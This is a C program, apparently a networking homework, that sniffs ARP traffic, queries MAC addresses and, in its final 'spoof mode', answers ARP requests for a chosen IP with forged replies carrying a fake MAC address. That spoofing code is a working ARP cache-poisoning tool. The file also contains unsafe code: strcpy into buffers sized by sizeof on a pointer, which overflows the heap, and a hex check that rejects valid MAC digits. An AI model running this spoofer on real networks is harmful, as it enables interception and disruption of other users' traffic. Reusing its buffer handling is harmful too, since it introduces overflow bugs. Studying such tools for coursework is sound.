#include <netinet/if_ether.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include "arp.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <unistd.h>

#include <getopt.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/ether.h>
/* 
 * Change "enp2s0f5" to your device name (e.g. "eth0"), when you test your hoework.
 * If you don't know your device name, you can use "ifconfig" command on Linux.
 * You have to use "enp2s0f5" when you ready to upload your homework.
 */
 
//#define DEVICE_NAME "enp2s0f5"
#define DEVICE_NAME "ens33"
#define BUFFER_SIZE 65535
#define ETH_MAC_LEN ETH_ALEN
#define false 0
#define true 1
#define ARP_HDRLEN 28      // ARP header length
#define ETH_HDRLEN 14      // Ethernet header length
/*
 * You have to open two socket to handle this program.
 * One for input , the other for output.
 */

void showHint(){
	printf("[ ARP sniffer and spoof program ]\n");
	printf("Format :\n");
	printf("1)sudo ./arp -l -a\n");
	printf("2)sudo ./arp -l <filter_ip_address>\n");
	printf("3)sudo ./arp -q <query_ip_address>\n");
	printf("4)sudo ./arp -<fake_mac_address> <target_ip_address>\n");
}

void print_receive_arp(struct ether_arp *arp,int isAllIP,char *specIP){
	char *tpa = get_target_protocol_addr(arp);
	struct arphdr hdr = arp->ea_hdr;
	if(isAllIP || !strcmp(specIP,tpa)){
		printf("Get ARP packet - Who has %s ?\t ",get_target_protocol_addr(arp));
		printf("Tell %s \n",get_sender_protocol_addr(arp));
	}
}

void print_reply_arp(struct ether_arp *arp){
	printf("%s ",get_sender_protocol_addr(arp));
	printf("is at ");
	for(int i=0;i<6;i++){
		printf("%02X",arp->arp_sha[i]);
		if(i!=5)printf(":");
	}
	printf("\n");
}

int validSubIP(const char *ip){
	int ipLen = strlen(ip);
	//If part of IP is 3429 or 15933 ... etc
	//That must not valid ip
	if(ipLen > 3) return false;
	
	//Contains a,b,c... the symbol other than numbers
	//Not in 0~9
	for(int i = 0; i < ipLen ; i++){
		if( !(ip[i] >='0' && ip[i] <='9') ) return false;
	}
	int ipInt = atoi(ip);
	//the value should in [0,255]
	return ipInt >=0 && ipInt<=255;
}


int isValidIP(char *ip){
	int ipLen = strlen(ip);
	int count = 0;
	
	//The ip contains three dots
	for(int i=0;i<ipLen;i++){
		if(ip[i] == '.')
			count++;
	}
	//The ip does not have 3 dots
	if(count!=3) return false;
	
	int dotCount = 0;
	char *ipCopy = (char*) malloc(sizeof(ip));
	strcpy(ipCopy,ip);
	//Slice ip with dot
	char *subIP = strtok(ipCopy,".");
	if(subIP == NULL) return false;
	while(subIP){
		if(!validSubIP(subIP))
			return false;
		subIP = strtok(NULL,".");
		if(subIP)
			dotCount++;
	}
	//Be sure IP is not "1...1" format or "5...5" etc.
	return dotCount == 3;
}


int isValidSubMac(char *subMAC){
	int length = strlen(subMAC);
	if(length!=2) return false;
	for(int i=0;i<length;i++){
		if( !((subMAC[i] >= '0' && subMAC[i]<='9') || subMAC[i]>='A' && subMAC[i]<='F') ) return false;
	}
	int macInt = atoi(subMAC);
	return macInt>=0 && macInt<=255;
}

int isValidMAC(char *MAC){
	int macLen = strlen(MAC);
	int count = 0 ;
	for(int i=0;i<macLen;i++){
		if(MAC[i] == ':')
			count ++;
	}
	//The mac does not have 5 colons
	if(count != 5) return false;
	
	int colonCount = 0;
	char *macCopy = (char*) malloc(sizeof(MAC));
	strcpy(macCopy,MAC);
	char *subMAC = strtok(macCopy,":");
	if(subMAC == NULL )return false;
	while(subMAC){
		if(!isValidSubMac(subMAC))return false;
		subMAC = strtok(NULL,":");
		if(subMAC)
			colonCount++;
	}
	return colonCount == 5;
}

int main(int argc,char *argv[])
{
	//Check if user run program with root
	if(geteuid() != 0){
		fprintf(stderr,"[ERROR] You must be root to use this program!\n");
		return 0;
	}
	if(argc!=3){
		showHint();
		exit(1);
	}
	//long options
	struct option long_options[] = {
		{ "help",0,NULL,'h' }
	};
	//-a -l -q flags
	char short_options[] = "l:q:";
	//Store argument(options) from bash
	int options = 0 ;
	
	int isFlagQSet = 0;
	int isFlagLSet = 0;
	int isDameon = 1;
	int isAllIP = 0;
	char *filterIP = NULL;
	char *queryIP = NULL;
	int flag = 1;
	void* buffer = (void*)malloc(BUFFER_SIZE);
	int data_length = 0;
	struct ether_arp *arp;
	struct ether_header *eth_header;
	char *header;
	/*
		Deal with options
	*/
	if(!(argc == 3 && isValidMAC(argv[1]) && isValidIP(argv[2]))){ // If user not start dameon
		//Then check options
		while((options = getopt_long(argc,argv,short_options,long_options,NULL))!=-1){
			switch(options){
				case 'l':
					if(!optarg){
						showHint();
						exit(1);
					}
					isDameon = 0;
					isFlagLSet = 1;
					filterIP = malloc(sizeof(optarg));
					strcpy(filterIP,optarg);
					//All IP
					if( !strcmp(filterIP,"-a") ){
						isAllIP = 1;
					}else{ //Filter specific ip
						isAllIP = 0;
						if(!isValidIP(filterIP)){
							fprintf(stderr,"[ERROR] Please input a valid IP address. For example 127.0.0.1\n");
							exit(1);
						}
					}
					break;
				case 'q': /* Q Flag */
					if(!optarg){
						showHint();
						exit(1);
					}
					isDameon = 0;
					isFlagQSet = 1;
					queryIP = malloc(sizeof(optarg));
					strcpy(queryIP,optarg);
					if(!isValidIP(queryIP)){
						fprintf(stderr,"[ERROR] Please input a valid IP address. For example 127.0.0.1\n");
						exit(1);
					}
					break;
				case '?':
				case 'h':
				default:
					showHint();
					return 1;
			}
		}
	}
	int sockfd_recv = 0, sockfd_send = 0;
	struct sockaddr_ll sa;
	struct ifreq req;
	struct in_addr myip;
	memset (&req, 0, sizeof (req));
	strncpy(req.ifr_name, DEVICE_NAME, IFNAMSIZ);
	// Open a recv socket in data-link layer.
	if((sockfd_recv = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)	
	{
		perror("open recv socket error");
		exit(1);
	}
	
	/*
	 * Use recvfrom function to get packet.
	 * recvfrom( ... )
	 
	 */
	
	printf("[ARP Sniffer and Spoof Program]\n");
	/*
	* Try receive socket 
	*/
	if(isFlagLSet){
		printf("### ARP Sniffer mode ###\n");
		while(1){
			data_length = recvfrom(sockfd_recv, buffer, BUFFER_SIZE, 0, NULL, NULL);
			if(data_length < 0 ){
				perror("Recv error!");
				exit(1);
			}
			eth_header = (struct ether_header*) buffer;
			header =  buffer + sizeof(struct ether_header);
			//This is arp packet
			if(ntohs(eth_header->ether_type) == ETHERTYPE_ARP){
				arp = (struct ether_arp*) header;
				print_receive_arp(arp,isAllIP,filterIP);
			}
		}
	}
	
	/*
	Query mac address for specific IP
	**/
	
	if(isFlagQSet){
		// Open a send socket in data-link layer.
		printf("### ARP Quey mode ###\n");
		if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
		{
			perror("open send socket error");
			exit(sockfd_send);
		}
		
		// This socket is used for retrieve sender IP and mac
		int sd;
		if ((sd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
			perror ("socket() failed to get socket descriptor for using ioctl()");
			exit (EXIT_FAILURE);
		}
		/*
		 * Use ioctl function binds the send socket and the Network Interface Card.
	`	 * ioctl( ... )
		 */
		/* Retrieve source IP*/
		if (ioctl (sd, SIOCGIFADDR, &req) < 0) {
			perror ("ioctl() failed to get source IP address");
			return (EXIT_FAILURE);
		}

		uint8_t src_ip[4]; /* our IP address */
		struct sockaddr_in *ipv4;
		ipv4 = (struct sockaddr_in *)&req.ifr_addr;
		memcpy (src_ip, &ipv4->sin_addr, 4 * sizeof (uint8_t));
		
		
		/* retrieve sender MAC */
		if (ioctl(sd, SIOCGIFHWADDR, &req) == -1) {
		    perror("SIOCGIFINDEX");
		    exit(1);
		}
		uint8_t src_mac[6];    /*our MAC address*/
		memcpy (src_mac, req.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
		/* Retrieve interface id */
		if(ioctl(sd,SIOCGIFINDEX,&req) == -1){
			perror("SIOCGIFINDEX");
			exit(1);
		}
		int ifindex = req.ifr_ifindex;
		close(sd);
		struct ether_arp arpheader;
		strcpy(arpheader.arp_spa,src_ip);

		struct addrinfo hints, *res;
		memset (&hints, 0, sizeof (struct addrinfo));
		hints.ai_family = AF_INET;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_flags = hints.ai_flags | AI_CANONNAME;
		int status;
		if ((status = getaddrinfo (queryIP, NULL, &hints, &res)) != 0) {
			fprintf (stderr, "getaddrinfo() failed: %s\n", gai_strerror (status));
			exit (EXIT_FAILURE);
		}
		ipv4 = (struct sockaddr_in *) res->ai_addr;
		/**
		Fill the target ip
		*/
		memcpy (&arpheader.arp_tpa, &ipv4->sin_addr, 4 * sizeof (uint8_t));
		memset(arpheader.arp_tha,0,6*sizeof(uint8_t));
		/*
		Fill in ea_hdr for arp header
		*/
		struct arphdr ea_hdr = {
			.ar_hrd = ARPHRD_ETHER,
			.ar_pro = htons (ETH_P_IP),
			.ar_hln = 6,
			.ar_pln = 4,
			.ar_op = htons(ARPOP_REQUEST)
		};
		arpheader.ea_hdr = ea_hdr;
		
		// Fill the parameters of the sa.
		sa.sll_family = AF_PACKET;
		sa.sll_ifindex = ifindex;
		sa.sll_halen = htons(6);
		memcpy (sa.sll_addr, src_mac, 6 * sizeof (uint8_t));
		
		//Fill sender mac
		memcpy(&arpheader.arp_sha,src_mac,6*sizeof(uint8_t));
		
		//Broadcast MAC
		uint8_t dst_mac[6];
		memset (dst_mac, 0xff, 6 * sizeof (uint8_t));
		//Frame length
		int frame_length = 6 + 6 + 2 + ARP_HDRLEN;
		uint8_t ether_frame[BUFFER_SIZE];
		memcpy (ether_frame, dst_mac, 6 * sizeof (uint8_t));
  		memcpy (ether_frame + 6, src_mac, 6 * sizeof (uint8_t));
		ether_frame[12] = ETH_P_ARP / 256;
		ether_frame[13] = ETH_P_ARP % 256;
		memcpy (ether_frame + ETH_HDRLEN, &arpheader, ARP_HDRLEN * sizeof (uint8_t));
		/*
		 * use sendto function with sa variable to send your packet out
		 * sendto( ... )
		 */
		int bytes = 0;
		if ((bytes = sendto (sockfd_send, ether_frame, frame_length, 0, (struct sockaddr *) &sa, sizeof (sa))) <= 0) {
			perror ("sendto() failed");
			exit (EXIT_FAILURE);
		}
		/**
		  Receive reply packet
		*/
		while(1){
			data_length = recvfrom(sockfd_recv, buffer, BUFFER_SIZE, 0, NULL, NULL);
			if(data_length < 0 ){
				perror("Recv error!");
				exit(1);
			}
			eth_header = (struct ether_header*) buffer;
			header =  buffer + sizeof(struct ether_header);
			//This is arp packet
			if(ntohs(eth_header->ether_type) == ETHERTYPE_ARP){
				arp = (struct ether_arp*) header;
				//Get Reply Packet
				if(htons(arp->ea_hdr.ar_op) == ARPOP_REPLY){
					//Print it
					print_reply_arp(arp);
					break;
				}
			}
		}
		
	}
	
	/**
	Dameon 
	Reply a fake mac address for specific IP
	*/
	if(isDameon){
		char *fakeMac = argv[1];
		char *targetIP = argv[2];
		printf("### ARP Spoof mode ###\n");
		while(1){
			data_length = recvfrom(sockfd_recv, buffer, BUFFER_SIZE, 0, NULL, NULL);
			if(data_length < 0 ){
				perror("Recv error!");
				exit(1);
			}
			eth_header = (struct ether_header*) buffer;
			header =  buffer + sizeof(struct ether_header);
			//This is arp packet
			if(ntohs(eth_header->ether_type) == ETHERTYPE_ARP){
				arp = (struct ether_arp*) header;
				//This packet is we want
				if(!strcmp(targetIP,get_target_protocol_addr(arp))){
					print_receive_arp(arp,0,targetIP);
					struct ether_arp arpheader;
					uint8_t mac[6];
					/*
					Fill sender fake mac & sender ip
					*/
					sscanf(fakeMac,"%02hhX:%02hhX:%02hhX:%02hhX:%02hhX:%02hhX",&mac[0],&mac[1],&mac[2],&mac[3],&mac[4],&mac[5]);
					memcpy(&arpheader.arp_sha,mac,6*sizeof(uint8_t));
					sscanf(targetIP,"%hhu.%hhu.%hhu.%hhu",&arpheader.arp_spa[0],&arpheader.arp_spa[1],&arpheader.arp_spa[2],&arpheader.arp_spa[3]);
					/**
					Fill target ip with old sender ip
					*/
					memcpy(&arpheader.arp_tha,arp->arp_sha,6*sizeof(uint8_t));
					memcpy(&arpheader.arp_tpa,arp->arp_spa,4*sizeof(uint8_t));
					/*
					Fill in ea_hdr for arp header
					*/
					struct arphdr ea_hdr = {
						.ar_hrd = ARPHRD_ETHER,
						.ar_pro = htons (ETH_P_IP),
						.ar_hln = 6,
						.ar_pln = 4,
						.ar_op = htons(ARPOP_REPLY)
					};
					arpheader.ea_hdr = ea_hdr;
					
					int sd;
					if ((sd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
						perror ("socket() failed to get socket descriptor for using ioctl()");
						exit (EXIT_FAILURE);
					}
					/* Retrieve interface id */
					if(ioctl(sd,SIOCGIFINDEX,&req) == -1){
						perror("SIOCGIFINDEX");
						exit(1);
					}
					int ifindex = req.ifr_ifindex;
					//Fill the sa parameter
					sa.sll_family = AF_PACKET;
					sa.sll_ifindex = ifindex;
					sa.sll_halen = htons(6);
					//Fill the mac of sender (fake mac)
					memcpy (sa.sll_addr, mac, 6 * sizeof (uint8_t));
					
					//Frame length
					int frame_length = 6 + 6 + 2 + ARP_HDRLEN;
					uint8_t ether_frame[BUFFER_SIZE];
					memcpy (ether_frame, get_target_hardware_addr(arp), 6 * sizeof (uint8_t));
					memcpy (ether_frame + 6, mac, 6 * sizeof (uint8_t));
					ether_frame[12] = ETH_P_ARP / 256;
					ether_frame[13] = ETH_P_ARP % 256;
					memcpy (ether_frame + ETH_HDRLEN, &arpheader, ARP_HDRLEN * sizeof (uint8_t));
					int bytes = 0;
					// Open a send socket in data-link layer.
					if((sockfd_send = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
					{
						perror("open send socket error");
						exit(sockfd_send);
					}
					if ((bytes = sendto (sockfd_send, ether_frame, frame_length, 0, (struct sockaddr *) &sa, sizeof (sa))) <= 0) {
						perror ("sendto() failed");
						exit (EXIT_FAILURE);
					}else{
						printf("Sent ARP Reply: %s is %s\nSend successfully.\n",targetIP,fakeMac);
						break;
					}
					
					
				}
			}
		}
	}


	return 0;
}

